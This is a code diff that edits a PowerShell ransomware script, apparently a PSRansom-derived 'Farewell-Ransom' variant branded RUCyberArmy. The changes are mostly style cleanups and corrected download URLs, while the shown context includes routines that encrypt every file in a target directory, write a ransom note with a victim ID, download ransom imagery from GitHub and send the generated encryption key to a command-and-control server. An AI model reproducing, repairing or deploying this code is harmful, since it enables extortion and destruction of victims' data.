@@ -39,10 +39,10 @@ $C2Status = $null
 
 # Errors
 if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
-if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
-if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
-if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
-if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($null -eq $args[0]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($null -eq $args[1]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($null -eq $args[2]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
+if ($null -eq $args[3]) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
 
 # Proxy Aware
 [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
@@ -166,8 +166,8 @@ function PopUpRansom {
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
 [void] [System.Windows.Forms.Application]::EnableVisualStyles() 
-Invoke-WebRequest -useb https://github.com/BZHack/Farewell-Ransom/blob/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
-Invoke-WebRequest -useb https://github.com/BZHack/Farewell-Ransom/blob/main/Demo/PSRansom.ico -Outfile $env:temp\RUCyberArmy.ico
+Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
+Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/PSRansom.ico -Outfile $env:temp\RUCyberArmy.ico
 $shell = New-Object -ComObject "Shell.Application"
 $shell.minimizeall()
 
@@ -248,7 +248,7 @@ Remove-Item $env:temp\RUCyberArmy* -force
 function R64Encoder { 
    if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
    if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
-   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "–") ; $base64 = $base64.Replace("/", "_")
+   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
    $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }
 
 function ShowInfo {
@@ -287,7 +287,7 @@ function CreateReadme {
    Add-Content -Path "$Directory$slash$Readme" -Value "Victim ID: 5079aa56-343a-11ed-a261-0242ac120002 `n" }
 
 function EncryptFiles {
-   Invoke-WebRequest -useb https://raw.githubusercontent.com/azgaviperr/misc/main/RUCyberArmy.jpg -Outfile $Directory\000_RUCyberArmy.jpg
+   Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
    $files = Get-ChildItem $Directory -Recurse -Exclude *.rsm,000_key.txt,000_readme.txt,000_RUCyberArmy.jpg  -File
    foreach ($file in $files.FullName) 
    { 
@@ -302,7 +302,7 @@ function EncryptFiles {
 }
 
 function EncryptFilesSafe {
-   Invoke-WebRequest -useb https://raw.githubusercontent.com/azgaviperr/misc/main/RUCyberArmy.jpg -Outfile $Directory\000_RUCyberArmy.jpg
+   Invoke-WebRequest -useb https://raw.githubusercontent.com/BZHack/Farewell-Ransom/main/Demo/RUCyberArmy.jpg -Outfile $env:temp\RUCyberArmy.jpg
    $files = Get-ChildItem $Directory -Recurse -Exclude *.rsm,000_key.txt,000_readme.txt,000_RUCyberArmy.jpg -File
    foreach ($file in $files.FullName) 
    { 
@@ -383,7 +383,7 @@ if ($Mode -eq "-d") {
    $C2Status = GetStatus ; Start-Sleep 1
    
    Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
-   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
+   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object {[char]$_})
    if ($C2Status) { SendResults ; Start-Sleep 1}
    Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
    CreateReadme ; EncryptFilesSafe ; if ($C2Status) { SendResults ; Start-Sleep 1
@@ -399,7 +399,7 @@ if ($Mode -eq "-d") {
       $C2Status = GetStatus ; Start-Sleep 1
    
       Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
-      $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
+      $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object {[char]$_})
       SendResults
    
       if (!$C2Status) { Write-Host "[+] Saving logs in 000_readme.txt.. and key in 000_key.txt" -ForegroundColor Blue
@@ -421,7 +421,7 @@ if ($Mode -eq "-d") {
       $C2Status = GetStatus ; Start-Sleep 1
    
       Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
-      $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
+      $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object {[char]$_})
       SendResults
    
       if (!$C2Status) { Write-Host "[+] Saving logs in 000_readme.txt.. and key in 000_key.txt" -ForegroundColor Blue
